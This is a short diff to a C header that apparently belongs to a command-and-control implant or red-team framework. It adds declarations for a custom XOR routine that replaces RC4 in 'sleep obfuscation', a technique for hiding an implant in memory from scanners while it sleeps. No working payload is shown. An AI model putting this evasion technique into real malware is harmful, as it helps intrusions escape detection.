@@ -36,6 +36,11 @@ typedef struct _SLEEP_PARAM
     PVOID   Slave;
 } SLEEP_PARAM, *PSLEEP_PARAM;
 
+/* Custom XOR cipher — replaces SystemFunction032 (RC4) for sleep obfuscation.
+ * Copied to heap at init; executed from outside encrypted image during sleep. */
+NTSTATUS WINAPI ObfXorCrypt( USTRING* Data, USTRING* Key );
+NTSTATUS WINAPI ObfXorCryptEnd( VOID );
+
 VOID SleepObf( );
 
 #endif
